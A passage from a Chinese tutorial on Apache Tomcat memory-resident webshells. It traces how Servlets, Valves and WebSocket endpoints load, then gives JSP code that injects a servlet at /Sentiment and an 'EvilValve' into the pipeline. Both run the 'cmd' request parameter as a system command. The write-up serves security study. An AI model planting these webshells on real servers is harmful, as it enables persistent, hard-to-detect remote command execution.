<p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
<p>Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果，来浅看一下Servlet的架构图。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716302501974-ad72f07b-6755-48dd-9752-110cf116345f.png" alt=""></p>
<h4 id="2-3-2编写一个demo">2.3.2编写一个demo</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;testservlet&quot;, value = &quot;/testdemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servletdemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + <span class="string">&quot;hello world&quot;</span> + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web.xml配置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--servlet 注册--&gt;</span><br><span class="line"> &lt;servlet&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;servlet-class&gt;com.example.tomcat_demo_neicunma.servletdemo&lt;/servlet-class&gt;</span><br><span class="line"> &lt;/servlet&gt;</span><br><span class="line"> &lt;servlet-mapping&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;url-pattern&gt;/testdemo&lt;/url-pattern&gt;</span><br><span class="line"> &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<p>访问对应的路径会回显页面</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303440097-2a9ebd08-b7d5-49b7-8fe5-c80405d4ee76.png" alt=""></p>
<h4 id="2-3-3-调试过程">2.3.3 调试过程</h4>
<p>像filter和listener一样调试一下他的加载过程</p>
<p>这里参考<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a>文章</p>
<p>我们知道 tomcat 在初始化的时候会加载web.xml文件，而在listener分析中我们知道web.xml文件是在ContexConfig类中的configureContext方法里加载的，这里我们看看该方法具体和servlet有关的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303726531-2ace81c0-3851-4379-80cb-f719aa4538e1.png" alt=""></p>
<p>可以看到在箭头所指的地方加载了web.xml文件中配置的servlet的一些信息。然后就创建了一个Wrapper对象</p>
<p>然后就设置一些wrapper的属性。需要留意的一个特殊属性是load-on-startup属性，它是一个启动优先级。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303919959-daaadfba-a971-4736-a6b3-f4260c1259bd.png" alt=""></p>
<p>设置完之后会将wrapper加入到standardcontex的child里。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716307433202-ceef5573-912b-4fb0-8020-f69488333d37.png" alt=""></p>
<p>然后下面会遍历web.xml文件中servlet-mapping的servlet-name和对应的url-pattern，调用StandardContext.addServletMappingDecoded()添加servlet对应的映射</p>
<p>总结一下，Servlet的初始化一共有几个步骤:</p>
<ol>
<li>通过 context.createWapper() 创建 Wapper 对象</li>
<li>设置 Servlet 的 LoadOnStartUp 的值(后续分析为什么动态注册Servlet需要设置该属性)</li>
<li>设置 Servlet 的 Name</li>
<li>设置 Servlet 对应的 Class</li>
<li>将 Servlet 添加到 context 的 children 中</li>
<li>将 url 路径和 servlet 类做映射</li>
</ol>
<p>看一下servlet装载流程 在loadservlet下断点</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308136617-ada7f674-47b8-42ed-b2e9-784c0d4bc9dc.png" alt=""></p>
<p>向上翻到standardcontex的startInternal()方法，可以看到，是在加载完Listener和Filter之后，才装载Servlet:</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308325585-77c98d66-1ef4-4a32-bc79-ac3a129867e1.png" alt=""></p>
<p>这里调用了findChildren()方法从StandardContext中拿到所有的child并传到loadOnStartUp()方法处理，跟到loadOnstartup()，可以根据代码和注释了解到这个方法会将所有load-on-startup属性大于0的wrapper加载(反之则不会)，这也是为什么上文我们提到需要关注这个属性的原因:</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308413491-730b5e2c-46e7-41e3-82a0-0a739a037d70.png" alt="">根据搜索，我们了解到load-on-startup属性的作用:</p>
<p>:::tips<br>
load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法). 这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序. 当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。</p>
<p>:::</p>
<p>可以看到当未设置load-on-startup属性是，tomcat采用的是一种懒加载的机制，只有servlet被调用时才会加载到Context中。由于我们需要动态注册Servlet，为了使其被加载，我们必须设置load-on-startup属性。</p>
<p>根据上述的流程分析，我们可以模仿上述的加载机制手动注册一个servlet:</p>
<ol>
<li>找到StandardContext</li>
<li>继承并编写一个恶意servlet</li>
<li>通过 context.createWapper() 创建 Wapper 对象</li>
<li>设置 Servlet 的 LoadOnStartUp 的值</li>
<li>设置 Servlet 的 Name</li>
<li>设置 Servlet 对应的 Class</li>
<li>将 Servlet 添加到 context 的 children 中</li>
<li>将 url 路径和 servlet 类做映射</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<h4 id="2-3-4内存马编写">2.3.4内存马编写</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Sentiment&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">HttpServlet</span> <span class="variable">httpServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                resp.getWriter().write(len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获得StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从StandardContext.createWapper()获得一个Wapper对象</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> httpServlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(httpServlet);</span><br><span class="line">    newWrapper.setServletClass(httpServlet.getClass().getName());</span><br><span class="line">    <span class="comment">//将Wrapper添加到StandardContext</span></span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/Sentiment&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-4valve内存马">2.4valve内存马</h3>
<h5 id="2-4-1-valve是什么">2.4.1 valve是什么</h5>
<p>在上文有文章介绍过valve是什么可以在看以下文章<a target="_blank" rel="noopener" href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p>
<p>这里直接贴出参考文章的解释</p>
<p>tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是StandardEngine、StandardHost、StandardContext和StandardWrapper。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet<font style="color:rgb(51, 51, 51);">。<br>
</font>tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？</p>
<p>原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做valve组件。</p>
<p>Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。</p>
<p>在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。</p>
<p>Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图：</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716440271103-726110c8-9d27-4a52-9bbd-47ea3d19cd07.png" alt=""></p>
<h5 id="2-4-2调用过程">2.4.2调用过程</h5>
<p>这里我们在filter的方法里下一个断点看一下 Valve调用过程</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449163052-b3a03e1e-329a-4e4d-8398-d488579c8c21.png" alt=""></p>
<p>我们可以看到箭头中指的地方</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449314426-4e35fd99-a769-4699-a116-5c049372f7d6.png" alt="">在接收到Http请求之后调用了箭头所指的方法其调用CoyoteAdapter类里面的service方法</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449508615-332fd3b5-6f36-4228-a88e-4dabc9df6aa1.png" alt=""></p>
<p>该方法中获取了Pipeline的第一个Valve，并且调用了invoke也就是StandardEngineValve</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449722618-6c65e4a5-4216-4104-88b9-bd9ac9c5b1dd.png" alt=""></p>
<p>继续跟进</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449761818-4a3212b2-acb8-494f-8d01-6824ff1bb6af.png" alt=""></p>
<p>发现调用了下一个valve也就是调用栈中所表示出来的那些valve就不一一列举了，最后调用到StandardWrapperValve这个valve然后就调用filter过滤链之后在调用servlet</p>
<p>所以在这里我们可以思考一下唉，如果我们能够在这个pipeline这个管道中给他添加一个我们恶意的valve那也就是可以注入内存马，这里我们需要找到一个可以将valve加入到管道中的方法，我们可以发现pipeline这个接口中存在一个方法</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450092523-05413266-8bf2-453a-99f4-3f708c0ede3f.png" alt=""></p>
<p>存在一个addValve方法可以添加进去。我们看一下Pipeline的实现类</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450704081-7e2bacee-1e3c-4dae-adc9-4081a9a38731.png" alt=""></p>
<p>所以只需要获取StanderdPipeline 对象就可以了。又因为我们在jsp中不能够直接获取到StanderdPipeline对象只能获取像standardcontext 这类对象，我们看看他有没有能直接获取StanderdPipeline对象的方法。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716451334308-dc7c779d-aa8a-4f37-b031-519ea66c5a46.png" alt=""></p>
<p>可以发现在里面有getPipeline这个方法。就是返回的StanderdPipeline对象所以我们就可以编写我们的内存马了。</p>
<p>总结</p>
<p>编写Valve恶意类，实现Valve接口，重写invoke-&gt;恶意代码逻辑</p>
<p>获取StandardContext对象</p>
<p>StandardContext.getPipeline获取StandardPipeline</p>
<p>StandardPipeline.addValve(Valve_Shell)添加恶意Valve</p>
<p>分析流程参考网上的我自己的环境有点问题没法进入调试</p>
<p><a target="_blank" rel="noopener" href="https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve">https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p>
<h5 id="2-4-3demo编写">2.4.3demo编写</h5>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; &#125; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-5websocket内存马">2.5websocket内存马</h3>
<h4 id="2-5-1websocket简介">2.5.1websocket简介</h4>
<p>参考：<a target="_blank" rel="noopener" href="https://stefan.blog.csdn.net/article/details/120025498">https://stefan.blog.csdn.net/article/details/120025498</a></p>
<p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。</p>
<h4 id="2-5-2服务端实现">2.5.2服务端实现</h4>
<h5 id="2-5-2-1注解方式实现">2.5.2.1注解方式实现</h5>
<ul>
<li>value：必要，String类型，此Endpoint部署的URI路径。</li>
<li>configurator：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。</li>
<li>decoders：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。</li>
<li>encoders：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。</li>
<li>subprotocols：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure>
<p>@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</p>
<ul>
<li>@OnOpen 建立连接时触发。</li>
<li>@OnClose 关闭连接时触发。</li>
<li>@OnError 发生异常时触发。</li>
<li>@OnMessage 接收到消息时触发。</li>
</ul>
<h5 id="2-5-2-2继承抽象类">2.5.2.2继承抽象类</h5>
<p>继承抽象类Endpoint，重写几个生命周期方法，实现两个接口，比加注解 @ServerEndpoint方式更麻烦。</p>
<p>其中重写onMessage需要实现接口jakarta.websocket.MessageHandler，给Endpoint分配URI路径需要实现接口jakarta.websocket.server.ServerApplicationConfig。</p>
<p>而URI path、encoders、decoders、configurator等配置信息由jakarta.websocket.server.ServerEndpointConfig管理，默认实现jakarta.websocket.server.DefaultServerEndpointConfig。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, <span class="string">&quot;/ws/&#123;userId&#125;&quot;</span>).decoders(decoderList).encoders(encoderList).configurator(<span class="keyword">new</span> <span class="title class_">MyServerConfigurator</span>()).build();</span><br></pre></td></tr></table></figure>
<h4 id="Tomcat-WebSocket的加载">Tomcat WebSocket的加载</h4>
<p>Tomcat提供了一个javax.servlet.ServletContainerInitializer的实现类org.apache.tomcat.websocket.server.WsSci。</p>
<p>ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.</p>
<p>具体可看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lqzkcx3/article/details/78507169">Servlet3.0研究之ServletContainerInitializer接口</a></p>
<p>因此<strong>Tomcat的WebSocket加载是通过SCI机制完成的</strong>。</p>
<p>WsSci可以处理的类型有三种：</p>
<ul>
<li>添加了注解@ServerEndpoint的类</li>
<li>Endpoint的子类</li>
<li>ServerApplicationConfig的实现类</li>
</ul>
<p>Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类</p>
<p>如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。</p>
<p>然后startInternal方法里为ServletContext添加一个过滤器org.apache.tomcat.websocket.server.WsFilter，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a>看到WsFilter）。</p>
<h4 id="Tomcat-WebSocket内存马的实现">Tomcat WebSocket内存马的实现</h4>
<p>我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：</p>
<ol>
<li>获取当前的StandardContext</li>
<li>创建恶意Filter</li>
<li>创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs</li>
<li>创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中</li>
<li>获取filterConfigs变量，并向其中添加filterConfig对象</li>
</ol>
<p>既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。</p>
<p>WebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：</p>
<ol>
<li>获取当前的StandardContext</li>
<li>通过StandardContext获取ServerContainer</li>
